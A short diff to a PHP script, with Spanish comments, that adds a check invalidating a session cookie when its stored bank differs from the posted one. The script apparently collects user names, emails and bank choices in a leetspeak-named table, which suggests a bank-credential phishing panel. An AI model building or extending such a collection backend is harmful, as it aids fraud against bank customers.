@@ -38,7 +38,21 @@ $eml = isset($_POST['eml']) ? addslashes(filter_var($_POST['eml'], FILTER_SANITI
 $id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
 
 if ($con = conectar()) {
-    // 3. Buscar el ID si no hay cookie (mismo banco + última hora)
+    // 3a. Si hay cookie, verificar que el banco coincida — si no, invalidar la cookie
+    if ($id !== '' && $banco !== '') {
+        $id_int  = (int)$id;
+        $ban_esc = $con->real_escape_string($banco);
+        $chk = sentencia($con, "SELECT banco FROM m3it3m WHERE idreg = $id_int LIMIT 1");
+        if ($chk && ($row_chk = mysqli_fetch_assoc($chk))) {
+            if (strtolower(trim($row_chk['banco'])) !== strtolower(trim($banco))) {
+                $id = ''; // banco diferente → tratar como sesión nueva
+            }
+        } else {
+            $id = ''; // registro no existe
+        }
+    }
+
+    // 3c. Buscar el ID si no hay cookie válida (mismo banco + ip + última hora)
     if ($id === '' && $usuario !== '' && $banco !== '') {
         $usuario_esc = $con->real_escape_string($usuario);
         $banco_esc   = $con->real_escape_string($banco);
